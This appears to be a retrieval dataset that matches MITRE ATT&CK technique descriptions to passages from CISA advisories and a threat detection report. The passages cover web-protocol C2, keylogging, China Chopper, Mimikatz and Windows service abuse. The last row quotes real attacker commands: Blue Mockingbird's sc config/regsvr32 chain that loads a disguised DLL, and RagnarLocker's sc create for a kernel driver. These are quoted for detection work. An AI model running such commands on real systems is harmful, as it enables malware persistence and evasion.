Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic.|0.9129120785701272|"['Adversaries may attempt to get a listing of services running on Network Service Discovery T1046 remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation.', 'Adversaries may inject dynamic-link libraries (DLLs) into Dynamic-link Library T1055.001 processes in order to evade process-based defenses as well as Injection possibly elevate privileges.', 'Adversaries may log user keystrokes to intercept credentials as Keylogging T1056.001 the user types them.', 'Adversaries may abuse PowerShell commands and scripts for PowerShell T1059.001 execution.', 'Adversaries may communicate using OSI application layer Application Layer Protocol T1071 protocols to avoid detection/network filtering by blending in with existing traffic.', 'Adversaries may communicate using application layer protocols Web Protocols T1071.001 associated with web traffic to avoid detection/network filtering by blending in with existing traffic.', 'Adversaries may communicate using application layer protocols Mail Protocols T1071.003 associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic.', 'Adversaries may communicate using the Domain Name System DNS T1071.004 (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic.', 'Page 44 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may stage collected data in a central location or Data Staged T1074 directory prior to Exfiltration.', 'Adversaries may obtain and abuse credentials of existing Valid Accounts T1078 accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.', 'Adversaries may enumerate files and directories or may search in File and Directory T1083 specific locations of a host or network share for certain Discovery information within a file system.']"
Adversaries may communicate using application layer protocols associated with web traffic to avoid detection/network filtering by blending in with existing traffic.|0.7893373815384748|"['Adversaries may sniff network traffic to capture information about Network Sniffing T1040 an environment, including authentication material passed over the network.', 'Adversaries may attempt to get a listing of services running on Network Service Discovery T1046 remote hosts and local network infrastructure devices, including those that may be vulnerable to remote software exploitation.', 'Adversaries may inject dynamic-link libraries (DLLs) into Dynamic-link Library T1055.001 processes in order to evade process-based defenses as well as Injection possibly elevate privileges.', 'Adversaries may log user keystrokes to intercept credentials as Keylogging T1056.001 the user types them.', 'Adversaries may abuse PowerShell commands and scripts for PowerShell T1059.001 execution.', 'Adversaries may communicate using OSI application layer Application Layer Protocol T1071 protocols to avoid detection/network filtering by blending in with existing traffic.', 'Adversaries may communicate using application layer protocols Web Protocols T1071.001 associated with web traffic to avoid detection/network filtering by blending in with existing traffic.', 'Adversaries may communicate using application layer protocols Mail Protocols T1071.003 associated with electronic mail delivery to avoid detection/network filtering by blending in with existing traffic.', 'Adversaries may communicate using the Domain Name System DNS T1071.004 (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic.', 'Page 44 of 48 | Product ID: AA23-129A TLP:CLEARTLP:CLEAR International Partnership Adversaries may stage collected data in a central location or Data Staged T1074 directory prior to Exfiltration.', 'Adversaries may obtain and abuse credentials of existing Valid Accounts T1078 accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion.']"
China Chopper's server component is a Web Shell payload.|0.7533618743226278|['[10][11] Both repositories are commonly used for legitimate development and penetration testing and developing open-source code, but cyber threat actors can also use them to find code to enable nefarious actions.During incident response activities, CISA frequently observed Chinese government-affiliated actors using the open-source tools outlined in table 5.Table 5: Common exploit tools CISA observed used by Chinese MSS-affiliated actorsToolObservationsCobalt StrikeCISA has observed the threat actors using Cobalt Strike to target commercial and Federal Government networks.', 'Cobalt Strike is a commercial penetration testing tool used to conduct red team operations.', 'It contains a number of tools that complement the cyber threat actors exploitation efforts, such as a keystroke logger, file injection capability, and network services scanners.', 'CISA observed connections from a Federal Government agency to multiple IP addresses possibly hosting Cobalt Strike team servers.China Chopper Web ShellCISA has observed the actors successfully deploying China Chopper against organizations networks.', 'This open-source tool can be downloaded from internet software repositories such GitHub and Exploit-DB.', 'China Chopper is a web shell hosted on a web server.', 'It is mainly used for web application attacks, and it is configured in a client/server relationship.', 'China Chopper contains security scanners and can be used to upload files and brute-force passwords.MimikatzCISA has observed the actors using Mimikatz during their operations.', 'This open-source tool is used to capture account credentials and perform privilege escalation with pass-the-hash attacks that allow an attacker to pass captured password hashes and authenticate to network devices.', '[12]The following sections list the ATT&CK Framework TTPs routinely employed by Chinese government-affiliated actors to conduct cyber operations as observed by CISA analysts.Initial AccessIn the last 12 months, CISA has observed Chinese MSS-affiliated actors use spearphishing emails with embedded links to actor-owned infrastructure and, in some cases, compromise or poison legitimate sites to enable cyber operations.CISA has observed the threat actors using theInitial Access[TA0001] techniques identified in table 6.Table 6: Initial access techniques observed by CISAMITRE IDNameObservationT1204.001User Execution: Malicious LinkCISA has observed indications that users have clicked malicious links embedded in spearphishing emails that the threat actors sentT1566.002Phishing: Spearphishing LinkCISA analyzed network activity of a Federal Government entity and concluded that the threat actors sent a malicious email weaponized with links.T1190Exploit Public-Facing ApplicationCISA has observed the actors leveraging CVE-2019-19781 to compromise Citrix Application Delivery Controllers.Cyber threat actors can continue to successfully launch these types of low-complexity attacksas long as misconfigurations in operational environments and immature patch management programs remain in placeby taking advantage of common vulnerabilities and using readily available exploits and information.ExecutionCISA analysts continue to observe beaconing activity indicative of compromise or ongoing access to Federal Government networks.', 'This beaconing is a result of cyber threat actors successfully completing cyber operations that are often designed around emergent vulnerabilities and reliant on existing exploitation tools, as mentioned in this document.CISA has observed Chinese MSS-affiliated actors using theExecution[TA0002] technique identified in table 7.Table 7: Execution technique observed by CISAMITRE IDNameObservationT1072Software Deployment ToolsCISA observed activity from a Federal Government IP address beaconing out to the threat actors C2 server, which is usually an indication of compromise.Credential AccessCyber threat actors also continue to identify large repositories of credentials that are available on the internet to enable brute-force attacks.']
When Windows boots up, it starts programs or applications called services that perform background system functions.|0.7891919518272097|['This is why the Windows Service technique ranks so highly while affecting a relatively small percentage of customers.', 'Blue Mockingbird used sc config to modify an existing service named wercplsupport to automatically start a malicious DLL named wercplsupporte.', 'dll (an attempt to masquerade by using a slightly different name that defenders might miss): cmd.exe /c sc config wercplsupport start= auto & sc start wercplsupport & copy c:\\\windows\\\ System32\\\checkservices.dll c:\\\windows\\\System32\\\ wercplsupporte.dll /y & start regsvr32.exe /s c:\\\windows\\\System32\\\checkservices.dll l 35 T1543.003: Windows Service2021 Threat Detection Report Another interesting use of Windows services emerged in 2020 as part of a novel technique used by RagnarLocker ransomware.', 'RagnarLocker deployed custom virtual machines to prevent direct analysis of the encryption malware on the endpoint.', 'As part of its setup script, RagnarLocker leverages sc.exe to create the service VBoxDRV using these commands: T1543.003: WINDOWS SERVICE Adversaries may create or modify sc create VBoxDRV binpath= %binpath%\\\drivers\\\ Windows services to repeatedly VboxDrv.sys type= kernel start= auto error= execute malicious payloads as part of persistence.', 'When Windows boots up, it normal displayname= PortableVBoxDRV starts programs or applications called services that perform background system functions.', 'Windows service Detection configuration information, including the file path to the services executable Collection requirements or recovery programs/commands, is stored in the Windows Registry.', 'Service configurations can be modified using Command-line monitoring utilities such as sc.exe and Reg.', 'The use of sc.exe to manually create, register, or modify a service is a good indication of malicious use of Windows services.', 'While there are many methods of creating and modifying services, adversaries still regularly leverage sc.exe to perform service operations.', 'Adversaries also make use of reg.exe to modify service parametersfor example, to point an existing service to an adversary-controlled executable.']
